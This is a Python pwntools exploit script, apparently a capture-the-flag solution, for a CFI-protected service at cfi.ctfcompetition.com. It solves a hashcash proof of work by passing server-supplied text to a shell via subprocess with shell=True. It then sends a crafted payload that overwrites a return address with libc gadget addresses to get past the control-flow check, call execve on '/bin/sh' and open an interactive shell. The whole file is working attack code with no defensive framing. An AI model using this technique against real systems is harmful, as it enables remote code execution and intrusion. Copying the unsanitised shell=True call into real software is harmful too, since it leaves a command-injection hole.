#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import subprocess
host = "10.211.55.8"
port = 8888

#CTF{g0_wiTH__th3_fLow}

host = "cfi.ctfcompetition.com"
port = 1337
r = remote(host,port)

data = r.recvuntil("\n")
q =  data.split()[2]
result = subprocess.check_output("hashcash -mb28 " + q,shell=True)
r.sendline(result)

# It's possiable different from local. You can use cyclic to finad to offset.
# [1] CFI violated: indirect branch at 0xff5c70b8 illegally targeted 0x78616172 
ret_stack_addr = 0xfffffd78

execve = 0xff59acc0
read_ret_in_libc = 0xff5c1980  
syscall_ret = 0xff5cd718

# Use it to overwirte the return address of read in the main function
# The id table of the address need to match 0x1600000003.
magic = 0xff59b418

sh = ret_stack_addr + 0x160
gadget_buf = ret_stack_addr + 0xe0

r.recvuntil("addr?")
r.sendline(hex(ret_stack_addr)[2:])
r.recvuntil("len?")
r.sendline(str(0x300))
r.recvuntil("data?")

r.sendline(p64(read_ret_in_libc) + p64(0xdeadbeef)*5 + p64(syscall_ret) + p64(0)+ p64(magic) + p64(gadget_buf) + p64(0)*2 + "d"*0x100 + "/bin/sh\x00" +  p64(sh) + p64(execve)+p64(0)*20)
r.interactive()

